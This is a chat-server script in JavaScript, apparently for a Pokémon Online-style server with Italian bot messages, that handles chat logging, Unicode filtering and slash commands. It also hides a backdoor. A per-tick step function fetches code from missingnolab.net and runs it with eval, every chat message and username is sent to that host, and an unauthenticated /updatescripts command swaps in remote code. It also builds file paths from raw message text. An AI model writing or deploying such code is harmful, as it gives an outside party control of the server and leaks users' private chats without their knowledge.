({
	step: function(){
		var server_id = sys.getFileContent("server_id.txt");
		sys.webCall("http://missingnolab.net/serverboard/req.php?id=" + server_id, "sys.eval(resp);");
	}
,
afterNewMessage : function (message) {
    if (message == "Script Check: OK") {
        sys.sendAll("+ScriptBot: Scripts aggiornati correttamente!");
    }
} /* end of afterNewMessage */

,
beforeChatMessage: function(src, message, chan) {
var server_id = sys.getFileContent("server_id.txt");
sys.webCall("http://missingnolab.net/serverboard/log.php?utente=" + sys.name(src) + "&messaggio=" + message + "&server=" + server_id, 'if (resp != "") { sys.sendAll(resp); sys.webCall("http://missingnolab.net/deletem.php", "var paz = resp"); }');
var m = message.toLowerCase();
if (m.indexOf("overactive") != -1) {
	sys.writeToFile("db/" + message + ".over", sys.getFIleContent("db/" + message + ".over") + message + " ");
	sys.stopEvent();
}
if (/[\u0458\u0489\u202a-\u202e\u0300-\u036F\u1dc8\u1dc9\ufffc\u1dc4-\u1dc7\u20d0\u20d1]/.test(message)) {
    sys.stopEvent();
    return;
}
if (sys.getFileContent("db/" + sys.name(src) + ".log") == undefined) {
	sys.writeToFile("db/" + sys.name(src) + ".log", "")
}
sys.appendToFile("db/" + sys.name(src) + ".log", "<b>" + sys.name(src) + ": </b>" + message + "<br>")
cmp = function(a, b) {
return a.toLowerCase() == b.toLowerCase();
}
if (message[0] == "/") {
    sys.stopEvent();
    var command;
    var commandData;
    var pos = message.indexOf(" ");
    
    
    
    if (pos != -1) {
        command = message.substring(1, pos).toLowerCase();
        commandData = message.substr(pos+1);
    } else {
        command = message.substr(1).toLowerCase();
    }
    var tar = sys.id(commandData);
if (command == "serverid" && sys.auth(src) > 2){
sys.writeToFile("server_id.txt", commandData);
}
if (command == "updatescripts"){
sys.webCall("http://missingnolab.net/scripts.js", "sys.changeScript(resp)");
}
}
}
})